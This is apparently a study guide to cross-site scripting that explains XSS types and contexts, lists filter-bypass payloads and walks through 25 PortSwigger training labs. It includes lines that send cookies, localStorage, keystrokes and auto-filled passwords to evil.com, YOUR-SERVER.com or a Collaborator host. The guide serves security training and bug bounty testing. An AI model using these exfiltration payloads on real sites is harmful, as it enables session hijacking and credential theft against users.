# ⚡ XSS — Complete Guide + All Labs Walkthrough

> **Goal of this doc:** Understand XSS deeply + solve every PortSwigger XSS lab.  
> **Time:** 3 hours. Concept first (30 min) → Labs in order (2.5 hours).  
> **Rule:** After each lab — come back, tick it off, move to next.

---

## 📋 Table of Contents

1. [What is XSS — Dead Simple Explanation](#1-what-is-xss--dead-simple-explanation)
2. [The 3 Types of XSS](#2-the-3-types-of-xss)
3. [XSS Contexts — Where Your Payload Lands](#3-xss-contexts--where-your-payload-lands)
4. [Payload Arsenal — Every Payload You Need](#4-payload-arsenal--every-payload-you-need)
5. [How to Hunt XSS on Real Targets](#5-how-to-hunt-xss-on-real-targets)
6. [All Labs — Step by Step](#6-all-labs--step-by-step)
7. [XSS in Bug Bounty — What Gets Paid](#7-xss-in-bug-bounty--what-gets-paid)

---

## 1. What is XSS — Dead Simple Explanation

### The One-Line Version

> XSS = You trick a website into running YOUR JavaScript in someone else's browser.

### Why That's Dangerous

JavaScript running in a browser can do anything the website can do:
- Read cookies → steal sessions → take over accounts
- Read the page → steal passwords being typed
- Make requests → perform actions as the victim
- Redirect the user → send them to phishing pages

### The Real-World Analogy

Imagine a notice board at a school where anyone can post messages.  
You post a message that says: *"Run to the principal's office RIGHT NOW."*  
Every student who reads the board obeys — because they trust the board.

XSS is the same thing. The browser **trusts the website**. If the website outputs your script — the browser runs it, no questions asked.

---

### The Same Origin Policy — What XSS Breaks

The browser has a security rule: **JavaScript from site A cannot read data from site B.**

```
evil.com JS  ──✗──→  Cannot read target.com cookies
```

But XSS bypasses this entirely. Your script isn't running from evil.com. It's running **inside target.com** — so it has full access to everything on target.com.

```
YOUR script injected into target.com  ──✓──→  Full access to target.com cookies, data, actions
```

---

## 2. The 3 Types of XSS

### Type 1: Reflected XSS

**One sentence:** Your script is in the URL → server reflects it back → runs in browser.

```
You craft a URL:
https://target.com/search?q=<script>alert(1)</script>

Server responds:
<h1>Search results for: <script>alert(1)</script></h1>

Browser sees the script tag → runs it → alert pops
```

**Flow:**
```
Attacker crafts URL  →  Victim clicks link  →  Server reflects script  →  Browser executes  →  Attacker wins
```

**Key points:**
- Only affects the person who clicks YOUR link
- You need to trick someone into clicking the URL
- Delivered via phishing emails, social media, chat messages
- Severity: Medium (requires user interaction)

---

### Type 2: Stored XSS (Persistent XSS)

**One sentence:** Your script is saved in the database → served to EVERY user who visits.

```
You post a comment:
<script>fetch('https://evil.com?c='+document.cookie)</script>

Comment is saved to database.

Every user who views that page → server sends the comment → browser runs the script
→ Their cookies are sent to your evil.com server
```

**Flow:**
```
Attacker posts payload  →  Saved in database  →  Every visitor loads the page  →  Browser executes  →  All users compromised
```

**Key points:**
- No need to trick individual users — stored forever
- One injection affects ALL users who view it
- Much more severe than reflected XSS
- Found in: comments, profiles, usernames, forum posts, chat messages
- Severity: High / Critical

---

### Type 3: DOM-Based XSS

**One sentence:** JavaScript on the page reads from the URL/input and writes it directly to the page without going through the server.

```javascript
// Vulnerable JavaScript on the page:
var search = location.search.split('q=')[1];
document.getElementById('results').innerHTML = 'You searched for: ' + search;

// Your URL:
https://target.com/search?q=<img src=x onerror=alert(1)>

// The JS reads your input from the URL
// Writes it directly to innerHTML
// Browser executes it
```

**Flow:**
```
Attacker crafts URL  →  Page JS reads URL parameter  →  JS writes it to DOM  →  Browser executes  →  No server involved at all
```

**Key points:**
- The server never even sees your payload — it never appears in the HTTP response
- Happens entirely in the browser
- Harder to find — you need to read JavaScript
- Sources (where data comes from): `location.search`, `location.hash`, `document.cookie`, `document.referrer`
- Sinks (where data gets written): `innerHTML`, `document.write()`, `eval()`, `setTimeout()`
- Severity: Medium to High

---

### Side by Side Comparison

| | Reflected | Stored | DOM-based |
|--|-----------|--------|-----------|
| **Payload stored?** | No | Yes — in database | No |
| **Server sends payload?** | Yes | Yes | No |
| **Who gets hit?** | Anyone clicking your link | Every user who visits | Anyone clicking your link |
| **Where to look** | URL params, search boxes | Comments, profiles, posts | JavaScript source code |
| **Severity** | Medium | High/Critical | Medium/High |
| **Harder to find?** | Easy | Easy | Hard |

---

## 3. XSS Contexts — Where Your Payload Lands

**This is the most important concept for solving labs.** The payload you use depends entirely on WHERE your input lands in the HTML. If you use the wrong payload for the wrong context — it won't work.

---

### Context 1: Between HTML Tags

Your input lands directly in the HTML body.

```html
<!-- What the page looks like: -->
<p>Hello, [YOUR INPUT HERE]</p>

<!-- Your input goes right between tags — inject a new tag -->
Payload: <script>alert(1)</script>

<!-- Result: -->
<p>Hello, <script>alert(1)</script></p>  ✓
```

**Payloads for this context:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
```

---

### Context 2: Inside an HTML Attribute

Your input lands inside an HTML tag's attribute value.

```html
<!-- What the page looks like: -->
<input type="text" value="[YOUR INPUT HERE]">

<!-- You need to BREAK OUT of the attribute first -->
Payload: "><script>alert(1)</script>

<!-- Result: -->
<input type="text" value=""><script>alert(1)</script>">  ✓
```

Or use an event handler within the attribute:
```html
<!-- If you're inside an attribute: -->
<input type="text" value="[YOUR INPUT]">

Payload: " onmouseover="alert(1)

<!-- Result: -->
<input type="text" value="" onmouseover="alert(1)">  ✓
```

**Payloads for this context:**
```html
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onblur="alert(1)
```

---

### Context 3: Inside a JavaScript String

Your input lands inside a JavaScript string in a `<script>` block.

```html
<!-- What the page looks like: -->
<script>
  var name = '[YOUR INPUT HERE]';
</script>

<!-- You need to BREAK OUT of the string and the script -->
Payload: ';alert(1)//

<!-- Result: -->
<script>
  var name = '';alert(1)//'';
</script>  ✓
```

**Payloads for this context:**
```javascript
';alert(1)//
'-alert(1)-'
\';alert(1)//
</script><script>alert(1)</script>
```

---

### Context 4: Inside a JavaScript String with Backslash Escaping

The app escapes your `'` with `\'` — but doesn't escape backslashes.

```javascript
// App escapes single quotes:
Input: test'  →  Output: var name = 'test\''  (broken)

// But you can escape the escaper:
Input: test\'  →  Output: var name = 'test\\'  (your ' is now free!)
Followed by: ;alert(1)//

Full payload: \';alert(1)//
```

---

### Context 5: Inside a Tag — href Attribute

```html
<a href="[YOUR INPUT]">Click me</a>

Payload: javascript:alert(1)

Result:
<a href="javascript:alert(1)">Click me</a>
<!-- User clicks → alert fires -->
```

---

### Context 6: Canonical Link Tag (Hidden Context)

```html
<link rel="canonical" href='[YOUR INPUT]'/>

Payload: ' accesskey='x' onclick='alert(1)

Result:
<link rel="canonical" href='' accesskey='x' onclick='alert(1)'/>
<!-- Press Alt+X (accesskey) → alert fires -->
```

---

## 4. Payload Arsenal — Every Payload You Need

### Basic Probing — Test These First

Always start with the simplest payload. If it works, done. If not, escalate.

```html
<!-- Step 1: Does the input appear in the page at all? -->
xsstest123

<!-- Step 2: Is HTML being interpreted? -->
<b>test</b>

<!-- Step 3: Is the script tag blocked? -->
<script>alert(1)</script>

<!-- Step 4: Try event handlers if script is blocked -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

---

### When `<script>` is Blocked

```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert`1`>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<iframe onload=alert(1)>
```

---

### When Quotes Are Filtered

```html
<!-- No quotes needed: -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Template literals (backticks): -->
<img src=x onerror=alert`1`>

<!-- HTML entities: -->
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
```

---

### When Angle Brackets Are Filtered

You're stuck inside an attribute — use event handlers only:
```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onblur="alert(1)
" onclick="alert(1)
```

---

### When Inside a JavaScript String

```javascript
';alert(1)//
'-alert(1)-'
\';alert(1)//
${alert(1)}          ← template literal context
```

---

### When `alert` Itself is Blocked

```javascript
// Use print() instead:
<script>print()</script>
<img src=x onerror=print()>

// Or confirm, prompt:
confirm(1)
prompt(1)

// Or eval:
eval('ale'+'rt(1)')

// Obfuscated:
window['alert'](1)
this['alert'](1)
```

---

### Encoding Bypasses

Sometimes filters check for keywords — encoding can bypass them:

```html
<!-- HTML entity encoding: -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- URL encoding (in href): -->
<a href="javascript:%61%6c%65%72%74%28%31%29">

<!-- Double URL encoding: -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Unicode: -->
\u0061\u006c\u0065\u0072\u0074(1)

<!-- Null bytes (sometimes bypass filters): -->
<scr\x00ipt>alert(1)</scr\x00ipt>
```

---

## 5. How to Hunt XSS on Real Targets

### Step 1: Find Every Input Point

Anywhere you can inject data is an input point. Use Burp to capture all traffic and catalog every single one.

```
In every page:
✓ Search boxes
✓ Login / registration fields
✓ Profile fields (name, bio, address, username)
✓ Comment / message boxes
✓ Contact forms
✓ File upload filenames
✓ URL parameters (?q=, ?search=, ?name=, ?message=)
✓ HTTP headers that appear in the response (User-Agent, Referer)
✓ JSON body fields in API requests
✓ Hidden form fields
```

### Step 2: Inject a Unique Probe String

Don't start with full XSS payloads. Start with a harmless unique string:

```
xss123test
```

Search the response for `xss123test`. This tells you:
- Is the input reflected at all?
- WHERE does it appear in the page? (HTML body, attribute, script, etc.)
- Is it encoded or raw?

### Step 3: Identify the Context

Once you find where your probe string lands, look at the surrounding HTML:

```html
<!-- Context: between HTML tags -->
<p>Results for: xss123test</p>

<!-- Context: inside attribute -->
<input value="xss123test">

<!-- Context: inside JavaScript -->
<script>var x = 'xss123test';</script>

<!-- Context: inside href -->
<a href="xss123test">
```

### Step 4: Choose the Right Payload

Use the context table from Section 3 — match your context to the right payload.

### Step 5: Escalate for Bug Bounty

`alert(1)` proves the bug exists. For a real bug bounty report — show real impact:

```javascript
// Steal cookies:
fetch('https://YOUR-SERVER.com?c='+document.cookie)

// Steal localStorage (tokens):
fetch('https://YOUR-SERVER.com?l='+JSON.stringify(localStorage))

// Keylogger:
document.addEventListener('keypress', e => fetch('https://YOUR-SERVER.com?k='+e.key))
```

> **Note:** For bug bounty reports, just proving `alert(1)` pops is usually enough. Some programs want you to show cookie theft. Never actually steal real user data — use a test account.

### Step 6: Check If Cookies Are Stealable

```javascript
// In browser console — can you read cookies?
console.log(document.cookie)

// If it returns something → HttpOnly is NOT set → cookie theft via XSS is valid
// If it returns empty string → HttpOnly IS set → cookies are safe but XSS still valid
```

---

## 6. All Labs — Step by Step

> 🟢 = Apprentice (easy) | 🟡 = Practitioner (medium) | 🔴 = Expert (hard)
> 
> Open PortSwigger → Web Security Academy → XSS → All Labs
> Solve in this exact order.

---

### 🟢 Lab 1: Reflected XSS into HTML context with nothing encoded

**What you'll learn:** The most basic XSS possible. No filters, no encoding.

**Steps:**
1. Open the lab
2. Find the search box
3. Type: `<script>alert(1)</script>`
4. Press search
5. Alert fires → lab solved ✓

**Why it works:** Your input lands between HTML tags with zero filtering. The browser sees a `<script>` tag and executes it.

---

### 🟢 Lab 2: Stored XSS into HTML context with nothing encoded

**What you'll learn:** Stored XSS — your payload saves to the database.

**Steps:**
1. Open the lab → find a blog post with a comment section
2. In the comment field type: `<script>alert(1)</script>`
3. Fill in name/email/website with anything and submit
4. Navigate back to the blog post
5. Alert fires when the page loads → lab solved ✓

**Why it works:** Comment is saved raw into the database. Every time the page loads, your script tag is served and executed.

---

### 🟢 Lab 3: DOM XSS in document.write sink using location.search

**What you'll learn:** DOM XSS — payload never goes to the server.

**Steps:**
1. Open the lab
2. Open browser DevTools → Sources tab
3. Find the JavaScript that uses `document.write` and `location.search`
4. In the search box, type: `"><svg onload=alert(1)>`
5. Alert fires → lab solved ✓

**Why it works:** The JS reads your search query and writes it with `document.write()` directly into an `<img src="...">` tag. You break out of the `src` attribute with `">` then inject your SVG.

---

### 🟢 Lab 4: DOM XSS in innerHTML sink using location.search

**What you'll learn:** innerHTML as a dangerous sink.

**Steps:**
1. Open the lab
2. In search, type: `<img src=1 onerror=alert(1)>`
3. Alert fires → lab solved ✓

**Why it works:** `innerHTML` doesn't execute `<script>` tags — but it DOES execute event handlers like `onerror`. So you use an image that fails to load, which triggers `onerror`.

---

### 🟢 Lab 5: DOM XSS in jQuery anchor href attribute sink using location.search

**What you'll learn:** jQuery as a source of DOM XSS.

**Steps:**
1. Open the lab — notice there's a feedback page with a `returnPath` parameter
2. Change the URL to: `?returnPath=javascript:alert(document.cookie)`
3. Click the "Back" link on the page
4. Alert fires → lab solved ✓

**Why it works:** jQuery reads `returnPath` from the URL and sets it as the `href` of the back link. You inject `javascript:` which executes when clicked.

---

### 🟢 Lab 6: DOM XSS in jQuery selector sink using a hashchange event

**What you'll learn:** jQuery's `$()` as a sink — triggered automatically.

**Steps:**
1. Open the lab
2. The page uses `$(location.hash)` to scroll to an element
3. Go to the exploit server (provided in the lab)
4. Paste this body:
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
5. Deliver exploit to victim → lab solved ✓

**Why it works:** The `$()` selector in jQuery treats the hash as HTML when it starts with `<`. The iframe automatically adds a malicious hash that jQuery executes.

---

### 🟢 Lab 7: Reflected XSS into attribute with angle brackets HTML-encoded

**What you'll learn:** When `<>` are filtered — use event handlers.

**Steps:**
1. Open the lab → search for anything
2. View source — notice your input is inside an `<input value="...">`
3. Your `<` and `>` get encoded to `&lt;` and `&gt;`
4. So you can't inject new tags — instead break out of the attribute:
5. Search for: `" onmouseover="alert(1)`
6. Hover your mouse over the search box → alert fires → lab solved ✓

**Why it works:** Even though `<>` are encoded, quotes are not. You close the attribute with `"`, add an event handler, and the quotes blend naturally.

---

### 🟢 Lab 8: Stored XSS into anchor href attribute with double quotes HTML-encoded

**What you'll learn:** Stored XSS in a link field using `javascript:`.

**Steps:**
1. Open the lab → go to a blog post → post a comment
2. In the **Website** field (not comment) enter: `javascript:alert(1)`
3. Submit the comment
4. Your name becomes a clickable link
5. Click your own name → alert fires → lab solved ✓

**Why it works:** The website field is put directly into `href="..."`. The `javascript:` protocol executes code when a link is clicked. Double quotes are encoded but `javascript:` doesn't need them.

---

### 🟢 Lab 9: Reflected XSS into a JavaScript string with angle brackets HTML-encoded

**What you'll learn:** Breaking out of a JavaScript string.

**Steps:**
1. Open the lab → search for something
2. View source → find where your input lands inside a JS string:
   ```javascript
   var searchTerms = 'YOUR INPUT';
   ```
3. Angle brackets are encoded — you can't inject HTML tags
4. But you CAN break out of the string with a single quote:
5. Search for: `'-alert(1)-'`
6. Result: `var searchTerms = ''-alert(1)-'';`
7. Alert fires → lab solved ✓

**Why it works:** Single quotes are NOT encoded. You close the string, run your code, then open a new string to keep the JS valid.

---

### 🟡 Lab 10: DOM XSS in document.write sink using location.search inside a select element

**What you'll learn:** XSS inside a `<select>` element.

**Steps:**
1. Open the lab — it's a stock checker with a storeId parameter
2. URL will be like: `/product?productId=1&storeId=...`
3. Add to URL: `&storeId=</select><img src=x onerror=alert(1)>`
4. Alert fires → lab solved ✓

**Why it works:** Your input is written inside a `<select>` tag. You close the select with `</select>` and inject your payload after it.

---

### 🟡 Lab 11: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

**What you'll learn:** AngularJS template injection as XSS.

**Steps:**
1. Open the lab — notice `ng-app` in the HTML (AngularJS is in use)
2. In the search box type: `{{$on.constructor('alert(1)')()}}`
3. Alert fires → lab solved ✓

**Why it works:** AngularJS processes `{{}}` as template expressions. Even though `<>` and `"` are encoded, `{{}}` is not. You use AngularJS's expression syntax to execute JavaScript.

---

### 🟡 Lab 12: Reflected DOM XSS

**What you'll learn:** DOM XSS where server processes the input but JS writes it dangerously.

**Steps:**
1. Open the lab → search for something
2. Open Burp → intercept the response → notice search results in JSON
3. Look at the JS — it uses `eval()` to process the response
4. Search for: `\"-alert(1)}//`
5. Alert fires → lab solved ✓

**Why it works:** The server JSON-encodes your input but backslash escapes quotes. You inject a backslash to escape the escaping, then close the JSON and run code.

---

### 🟡 Lab 13: Stored DOM XSS

**What you'll learn:** Stored XSS where JS writes comments to DOM unsafely.

**Steps:**
1. Open the lab → post a comment
2. Look at the JS source — it uses `innerHTML` to render comments
3. But it replaces `<>` with HTML entities...
4. Try: `<><img src=1 onerror=alert(1)>`
5. The `<>` at the start gets replaced — but your actual payload gets through
6. Alert fires on page load → lab solved ✓

**Why it works:** The replace function only replaces the first occurrence of `<` and `>`. By prepending `<>`, you "use up" the replace, leaving your real payload untouched.

---

### 🟡 Lab 14: Exploiting XSS to steal cookies

**What you'll learn:** Real impact — stealing a session cookie via stored XSS.

**Steps:**
1. Open the lab → blog post → comment section
2. Go to the exploit server → Burp Collaborator (or the lab provides a server)
3. Post a comment with:
```html
<script>
fetch('https://YOUR-COLLABORATOR-ID.burpcollaborator.net?c='+document.cookie)
</script>
```
4. Wait for the victim (automated) to visit the page
5. Check your collaborator — you'll see a request with their cookie
6. Lab solved ✓

---

### 🟡 Lab 15: Exploiting XSS to capture passwords

**What you'll learn:** Using XSS to steal auto-filled credentials.

**Steps:**
1. Post this comment:
```html
<input name=username id=username>
<input type=password name=password onchange="
  fetch('https://YOUR-SERVER.com?u='+username.value+'&p='+this.value)
">
```
2. When the victim's browser auto-fills credentials → your fetch fires → captures them
3. Lab solved ✓

---

### 🟡 Lab 16: Reflected XSS into HTML context with most tags and attributes blocked

**What you'll learn:** Bypassing tag/attribute filters using a cheat sheet.

**Steps:**
1. Open the lab → search with `<img src=x>` → you get "Tag is not allowed"
2. Use Burp Intruder to fuzz which tags are allowed:
   - Send the search request to Intruder
   - Payload position: `<§TAG§>`
   - Load the PortSwigger XSS cheat sheet tag list as payloads
   - Run — look for 200 responses (tag allowed)
3. Find `<body>` is allowed
4. Now fuzz events on `<body>`:
   - Payload: `<body §EVENT§=1>`
   - Find allowed event (e.g. `onresize`)
5. Final payload (delivered via iframe):
```html
<iframe src="https://TARGET/?search=<body onresize=print()>" onload=this.style.width='100px'>
```
6. Lab solved ✓

---

### 🟡 Lab 17: Reflected XSS into HTML context with all tags blocked except custom ones

**What you'll learn:** Custom HTML tags bypass tag filters.

**Steps:**
1. The app blocks all standard tags but allows custom ones
2. Payload:
```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```
3. Deliver via exploit server as:
```html
<script>
location = 'https://TARGET/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```
4. Lab solved ✓

**Why it works:** Custom tags aren't in the filter's blocklist. `tabindex` and `#x` in the URL makes the browser focus on the element automatically, triggering `onfocus`.

---

### 🟡 Lab 18: Reflected XSS with some SVG markup allowed

**What you'll learn:** SVG namespace bypass.

**Steps:**
1. Fuzz — find that `<svg>`, `<animatetransform>` are allowed
2. Payload:
```html
<svg><animatetransform onbegin=alert(1)>
```
3. Lab solved ✓

---

### 🟡 Lab 19: Reflected XSS in canonical link tag

**What you'll learn:** XSS in `<link>` tags using accesskey.

**Steps:**
1. The page puts your URL into a canonical link tag:
   `<link rel="canonical" href='https://target.com/?YOUR-INPUT'/>`
2. Payload (add to URL):
   `?%27accesskey=%27x%27onclick=%27alert(1)`
3. Press Alt+X (accesskey shortcut) → alert fires → lab solved ✓

---

### 🟡 Lab 20: Reflected XSS into a JavaScript string with single quote and backslash escaped

**What you'll learn:** Bypassing `\'` escaping.

**Steps:**
1. Input lands in: `var searchTerm = 'YOUR INPUT';`
2. Single quotes are escaped: `'` → `\'`
3. BUT backslashes are not escaped
4. Payload: `\';alert(1)//`
5. Result: `var searchTerm = '\\';alert(1)//';`
   - `\\` = escaped backslash (just a backslash, not escaping the quote)
   - `'` closes the string
   - `alert(1)` runs
6. Lab solved ✓

---

### 🟡 Lab 21: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded, single quotes escaped

**What you'll learn:** Template literal injection.

**Steps:**
1. Input lands in: `` var searchTerms = `YOUR INPUT`; `` (backtick string)
2. Inject: `${alert(1)}`
3. Lab solved ✓

**Why it works:** Template literals execute `${}` expressions. If the app uses backtick strings, `${}` is your injection syntax.

---

### 🟡 Lab 22: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

**What you'll learn:** HTML entity bypass inside event handlers.

**Steps:**
1. Post a comment — website field goes into an `onclick` attribute
2. The sink: `onclick="var tracker={track(){}};tracker.track('YOUR-INPUT');"`
3. Payload in website field: `http://foo?&apos;-alert(1)-&apos;`
4. `&apos;` is the HTML entity for `'` — it gets decoded inside the attribute
5. Lab solved ✓

---

### 🟡 Lab 23: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

**What you'll learn:** Template literal with escaping — use `${}` directly.

**Steps:**
1. Input inside: `` var message = `0 search results for 'YOUR INPUT'`; ``
2. Angle brackets and quotes are all escaped — but `${` is not
3. Payload: `${alert(1)}`
4. Lab solved ✓

---

### 🔴 Lab 24: Reflected XSS with event handlers and href attributes blocked

**What you'll learn:** SVG animate tag bypass.

**Steps:**
1. Most event handlers blocked, `href` blocked
2. Use `<svg>` with `<animate>` to set an attribute that runs code:
```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>
```
3. Lab solved ✓

---

### 🔴 Lab 25: Reflected XSS in a JavaScript URL with some characters blocked

**What you'll learn:** JavaScript URL with `throw` statement.

**Steps:**
1. URL parameter ends up inside a `javascript:` href
2. Spaces blocked but you need to call alert
3. Payload:
```
javascript:fetch('/analytics',{method:'post',body:'/post%3fpostId%3d5'}).finally(()=>location='https://TARGET/?'+alert`1`)
```
4. Lab solved ✓

---

## 7. XSS in Bug Bounty — What Gets Paid

### Severity Ratings

| XSS Type | Where | Severity | Typical Payout |
|----------|-------|----------|----------------|
| Stored XSS | Admin panel | Critical | $500 - $5000+ |
| Stored XSS | User profile visible to others | High | $300 - $2000 |
| Stored XSS | Low-traffic page | Medium | $100 - $500 |
| Reflected XSS | Main app | Medium | $100 - $500 |
| Self-XSS | Only affects yourself | ❌ Usually N/A | $0 |
| DOM XSS | With cookie theft | High | $200 - $1000 |

### What Makes XSS High Severity

1. **Cookie theft** → account takeover
2. **Admin panel** → full application compromise
3. **No HttpOnly on session cookie** → cookie is actually stealable
4. **Stored (persistent)** → affects all users
5. **No user interaction needed** → auto-executes on page load

### What Makes XSS Low/Invalid

1. **Self-XSS** — only works on yourself, not others
2. **Requires login as admin to trigger** — limited impact
3. **HttpOnly on all cookies** — cookies can't be stolen (but XSS is still valid — mention other impacts)
4. **CSP blocks execution** — report anyway, but mention it's mitigated

### Your Bug Report Template for XSS

```markdown
**Title:** Stored XSS in [feature] allows session hijacking

**Severity:** High

**Summary:**
The [comment/profile/bio] field on [page] does not sanitize user input.
An attacker can store a malicious script that executes in every visitor's browser,
enabling cookie theft and account takeover.

**Steps to Reproduce:**
1. Log in to the application
2. Navigate to [page]
3. Enter the following in the [field]: <script>alert(document.cookie)</script>
4. Submit the form
5. Navigate to [page where it appears]
6. The script executes, displaying the cookie value

**Expected Behavior:**
User input should be HTML-encoded before being rendered.
`<script>` should appear as `&lt;script&gt;` — not execute.

**Actual Behavior:**
The script executes, popping an alert with cookie contents.

**Impact:**
An attacker can replace alert(document.cookie) with a fetch to a remote server
to steal session cookies and take over any user's account.

**Proof:**
[Screenshot of alert with cookie value]
[Screenshot of the raw HTTP request in Burp]
```

---

## ⏱️ 3-Hour Lab Schedule

```
0:00 - 0:30  →  Read Sections 1, 2, 3 of this doc (concepts)
0:30 - 0:45  →  Read Sections 4, 5 (payloads + methodology)
0:45 - 1:30  →  Solve Labs 1–9 (Apprentice level — all should be fast)
1:30 - 2:30  →  Solve Labs 10–19 (Practitioner — take your time)
2:30 - 3:00  →  Solve Labs 20–25 (harder ones + any you're stuck on)

Stuck on a lab? → Screenshot the page source → send it to Claude
```

---

## ✅ Lab Completion Tracker

| # | Lab Name | Type | Done? |
|---|----------|------|-------|
| 1 | Reflected XSS into HTML context, nothing encoded | Reflected | ⬜ |
| 2 | Stored XSS into HTML context, nothing encoded | Stored | ⬜ |
| 3 | DOM XSS in document.write using location.search | DOM | ⬜ |
| 4 | DOM XSS in innerHTML using location.search | DOM | ⬜ |
| 5 | DOM XSS in jQuery anchor href | DOM | ⬜ |
| 6 | DOM XSS in jQuery selector, hashchange | DOM | ⬜ |
| 7 | Reflected XSS into attribute, angle brackets encoded | Reflected | ⬜ |
| 8 | Stored XSS into href, double quotes encoded | Stored | ⬜ |
| 9 | Reflected XSS into JS string, angle brackets encoded | Reflected | ⬜ |
| 10 | DOM XSS in document.write inside select element | DOM | ⬜ |
| 11 | DOM XSS in AngularJS expression | DOM | ⬜ |
| 12 | Reflected DOM XSS | DOM | ⬜ |
| 13 | Stored DOM XSS | DOM | ⬜ |
| 14 | Exploiting XSS to steal cookies | Stored | ⬜ |
| 15 | Exploiting XSS to capture passwords | Stored | ⬜ |
| 16 | Reflected XSS, most tags blocked | Reflected | ⬜ |
| 17 | Reflected XSS, all tags blocked except custom | Reflected | ⬜ |
| 18 | Reflected XSS with some SVG markup allowed | Reflected | ⬜ |
| 19 | Reflected XSS in canonical link tag | Reflected | ⬜ |
| 20 | Reflected XSS into JS string, `\'` escaping | Reflected | ⬜ |
| 21 | Reflected XSS into JS template literal | Reflected | ⬜ |
| 22 | Stored XSS into onclick, quotes escaped | Stored | ⬜ |
| 23 | Reflected XSS in template literal, all escaped | Reflected | ⬜ |
| 24 | Reflected XSS, event handlers and href blocked | Reflected | ⬜ |
| 25 | Reflected XSS in JavaScript URL | Reflected | ⬜ |

---

*Stuck on any lab? Screenshot the page source and the response in Burp → send to Claude → solved.*
